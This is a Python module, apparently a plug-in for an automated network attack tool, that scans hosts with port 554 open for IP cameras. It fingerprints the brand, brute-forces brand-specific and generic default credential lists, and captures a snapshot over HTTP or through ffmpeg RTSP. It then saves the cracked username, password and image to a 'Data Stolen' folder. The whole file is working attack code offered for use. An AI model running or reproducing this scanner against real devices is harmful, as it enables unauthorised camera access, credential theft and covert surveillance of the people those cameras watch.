"""
ipcam_scanner.py - IP Camera discovery, default-credential testing, and snapshot capture.

Triggered by the orchestrator when port 554 (RTSP) is discovered open on a host.
Fingerprints the camera brand, tries known default credentials, then grabs a snapshot
via HTTP snapshot URL or an ffmpeg RTSP fallback. Saves results to Data Stolen.
"""

import os
import json
import logging
import subprocess
import time
from datetime import datetime

try:
    import requests
    from requests.auth import HTTPBasicAuth, HTTPDigestAuth
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from shared import SharedData
from logger import Logger

logger = Logger(name="ipcam_scanner.py", level=logging.INFO)

b_class  = "IpCameraScanner"
b_module = "ipcam_scanner"
b_status = "ipcam_scan"
b_port   = 554   # RTSP — camera-specific, already in Ragnar's default portlist
b_parent = None

# ---------------------------------------------------------------------------
# Default credential lists — brand-specific first, generic fallback last
# ---------------------------------------------------------------------------
BRAND_CREDS = {
    "hikvision": [
        ("admin", "12345"), ("admin", "admin"), ("admin", ""),
        ("admin", "12345678"), ("admin", "Admin123"),
    ],
    "dahua": [
        ("admin", "admin"), ("admin", ""), ("888888", "888888"),
        ("666666", "666666"), ("admin", "dahua123"),
    ],
    "axis": [
        ("root", "pass"), ("root", ""), ("root", "root"),
        ("admin", "admin"), ("admin", ""),
    ],
    "foscam": [
        ("admin", ""), ("admin", "admin"), ("admin", "foscam"),
        ("admin", "12345"),
    ],
    "amcrest": [
        ("admin", "admin"), ("admin", ""), ("admin", "amcrest"),
    ],
    "reolink": [
        ("admin", ""), ("admin", "admin"), ("admin", "123456"),
    ],
    "hanwha": [
        ("admin", "admin1234"), ("admin", "4321"), ("admin", "admin"),
    ],
    "tplink": [
        ("admin", "admin"), ("admin", ""), ("admin", "tplink"),
    ],
    "generic": [
        ("admin", "admin"), ("admin", ""), ("admin", "12345"),
        ("admin", "123456"), ("admin", "1234"), ("admin", "password"),
        ("root", "root"), ("root", ""), ("root", "12345"),
        ("user", "user"), ("guest", "guest"), ("admin", "admin123"),
        ("admin", "Admin123"),
    ],
}

# HTTP paths to probe for brand fingerprinting and snapshot capture
BRAND_KEYWORDS = {
    "hikvision": ["hikvision", "webs/hik", "isapi", "ipc_app", "webComponents/"],
    "dahua":     ["dahua", "dh-ipc", "dh-sd", "/RPC2", "logreq"],
    "axis":      ["axis", "vapix", "axisnet"],
    "foscam":    ["foscam", "webui", "ipcam"],
    "amcrest":   ["amcrest", "amcview"],
    "reolink":   ["reolink"],
    "hanwha":    ["hanwha", "samsung techwin", "wisenet"],
    "tplink":    ["tp-link", "tplink", "ipc"],
}

HTTP_SNAPSHOT_PATHS = [
    "/cgi-bin/snapshot.cgi",
    "/snap.jpg",
    "/snapshot.jpg",
    "/image.jpg",
    "/tmpfs/snap.jpg",
    "/cgi-bin/currentpic.cgi",
    "/onvif-http/snapshot",
    "/cgi-bin/video.jpg",
    "/shot.jpg",
    "/mjpg/snapshot.cgi",
    "/api/snapshot",
    "/stream/0/snapshot",
    "/capture",
]

RTSP_PATHS = [
    "/stream0",
    "/stream1",
    "/live",
    "/live/main",
    "/live/sub",
    "/ch0_0.264",
    "/h264Preview_01_main",
    "/h264Preview_01_sub",
    "/cam/realmonitor?channel=1&subtype=0",
    "/Streaming/Channels/1",
    "/axis-media/media.amp",
    "/videoMain",
    "/0",
]

HTTP_PORTS = [80, 8080, 443, 8081, 8000, 8443, 81]
REQUEST_TIMEOUT = 5   # seconds per HTTP request
RTSP_TIMEOUT   = 10  # seconds for ffmpeg snapshot


class IpCameraScanner:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        logger.info("IpCameraScanner initialized")

    # ------------------------------------------------------------------
    # Orchestrator entry point
    # ------------------------------------------------------------------

    def execute(self, ip, port, row, status_key):
        """Called by orchestrator when port 554 is open on a host."""
        if not getattr(self.shared_data, 'ipcam_enabled', True):
            logger.debug(f"IP camera scanner disabled — skipping {ip}")
            return 'skipped'

        if not HAS_REQUESTS:
            logger.error("requests library not available — cannot run ipcam_scanner")
            return 'failed'

        self.shared_data.ragnarorch_status = b_status
        logger.info(f"🎥 IpCameraScanner: probing {ip}")

        mac = row.get("MAC", "unknown").replace(":", "").lower()
        open_ports = self._extract_ports(row)
        http_ports = [p for p in HTTP_PORTS if p in open_ports]
        rtsp_port  = port  # confirmed 554 open

        # Already successfully scanned?
        out_dir = os.path.join(self.shared_data.datastolendir, "ipcam", f"{mac}_{ip}")
        info_file = os.path.join(out_dir, "camera_info.json")
        if os.path.exists(info_file):
            logger.info(f"Already scanned {ip} — skipping (delete camera_info.json to re-scan)")
            return 'success'

        brand = self._fingerprint(ip, http_ports)
        logger.info(f"  Brand detected: {brand}")

        creds = self._try_credentials(ip, http_ports, brand)
        if not creds:
            logger.info(f"  No valid credentials found for {ip}")
            return 'failed'

        user, password = creds
        logger.info(f"  ✅ Valid creds for {ip}: {user}:{password}")

        snapshot_path = self._grab_snapshot(ip, rtsp_port, http_ports, user, password, out_dir)
        self._save_metadata(out_dir, info_file, ip, mac, brand, user, password, snapshot_path)

        if snapshot_path:
            logger.info(f"  📸 Snapshot saved: {snapshot_path}")
            return 'success'
        else:
            logger.warning(f"  Creds found but snapshot failed for {ip}")
            return 'success'   # still a win — creds are saved in metadata

    # ------------------------------------------------------------------
    # Brand fingerprinting
    # ------------------------------------------------------------------

    def _fingerprint(self, ip, http_ports):
        """Return brand string by probing HTTP root page."""
        if not http_ports:
            return "generic"

        for port in http_ports:
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{ip}:{port}/"
            try:
                resp = requests.get(url, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
                text = (resp.text or "").lower()
                headers = " ".join(f"{k}:{v}" for k, v in resp.headers.items()).lower()
                combined = text + " " + headers
                for brand, keywords in BRAND_KEYWORDS.items():
                    if any(kw.lower() in combined for kw in keywords):
                        return brand
            except Exception:
                continue

        return "generic"

    # ------------------------------------------------------------------
    # Credential testing
    # ------------------------------------------------------------------

    def _try_credentials(self, ip, http_ports, brand):
        """Try brand-specific then generic credentials. Returns (user, pass) or None."""
        cred_list = list(BRAND_CREDS.get(brand, [])) + [
            c for c in BRAND_CREDS["generic"] if c not in BRAND_CREDS.get(brand, [])
        ]

        for port in (http_ports or HTTP_PORTS[:2]):
            scheme = "https" if port in (443, 8443) else "http"
            for user, password in cred_list:
                if self._test_credential(scheme, ip, port, user, password):
                    return (user, password)
        return None

    def _test_credential(self, scheme, ip, port, user, password):
        """Return True if credential authenticates (HTTP 200 with image content)."""
        for path in HTTP_SNAPSHOT_PATHS[:5]:  # quick sample of paths
            url = f"{scheme}://{ip}:{port}{path}"
            for auth_class in (HTTPBasicAuth, HTTPDigestAuth):
                try:
                    resp = requests.get(
                        url,
                        auth=auth_class(user, password),
                        timeout=REQUEST_TIMEOUT,
                        verify=False,
                        stream=True,
                    )
                    ct = resp.headers.get("Content-Type", "")
                    if resp.status_code == 200 and ("image" in ct or len(resp.content) > 1000):
                        return True
                except Exception:
                    continue
        return False

    # ------------------------------------------------------------------
    # Snapshot capture
    # ------------------------------------------------------------------

    def _grab_snapshot(self, ip, rtsp_port, http_ports, user, password, out_dir):
        """Try HTTP snapshot first, then ffmpeg RTSP fallback. Returns saved path or None."""
        os.makedirs(out_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = os.path.join(out_dir, f"snapshot_{ts}.jpg")

        # --- HTTP snapshot ---
        for port in (http_ports or HTTP_PORTS[:2]):
            scheme = "https" if port in (443, 8443) else "http"
            for path in HTTP_SNAPSHOT_PATHS:
                url = f"{scheme}://{ip}:{port}{path}"
                for auth_class in (HTTPBasicAuth, HTTPDigestAuth):
                    try:
                        resp = requests.get(
                            url,
                            auth=auth_class(user, password),
                            timeout=REQUEST_TIMEOUT,
                            verify=False,
                        )
                        ct = resp.headers.get("Content-Type", "")
                        if resp.status_code == 200 and ("image" in ct or len(resp.content) > 2000):
                            with open(out_path, "wb") as fh:
                                fh.write(resp.content)
                            return out_path
                    except Exception:
                        continue

        # --- ffmpeg RTSP fallback ---
        for path in RTSP_PATHS:
            rtsp_url = f"rtsp://{user}:{password}@{ip}:{rtsp_port}{path}"
            try:
                result = subprocess.run(
                    [
                        "ffmpeg", "-y",
                        "-rtsp_transport", "tcp",
                        "-i", rtsp_url,
                        "-frames:v", "1",
                        "-q:v", "2",
                        out_path,
                    ],
                    timeout=RTSP_TIMEOUT,
                    capture_output=True,
                )
                if result.returncode == 0 and os.path.exists(out_path) and os.path.getsize(out_path) > 500:
                    return out_path
            except (subprocess.TimeoutExpired, FileNotFoundError):
                break  # ffmpeg not available or timed out — stop trying

        return None

    # ------------------------------------------------------------------
    # Metadata
    # ------------------------------------------------------------------

    def _save_metadata(self, out_dir, info_file, ip, mac, brand, user, password, snapshot_path):
        os.makedirs(out_dir, exist_ok=True)
        info = {
            "ip": ip,
            "mac": mac,
            "brand": brand,
            "username": user,
            "password": password,
            "snapshot": os.path.basename(snapshot_path) if snapshot_path else None,
            "scanned_at": datetime.now().isoformat(),
        }
        with open(info_file, "w", encoding="utf-8") as fh:
            json.dump(info, fh, indent=2)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _extract_ports(self, row):
        """Return list of int ports from a scan row."""
        raw = row.get("Ports", "") or ""
        ports = []
        for p in str(raw).split(","):
            p = p.strip().split("/")[0]
            try:
                ports.append(int(p))
            except ValueError:
                continue
        return ports
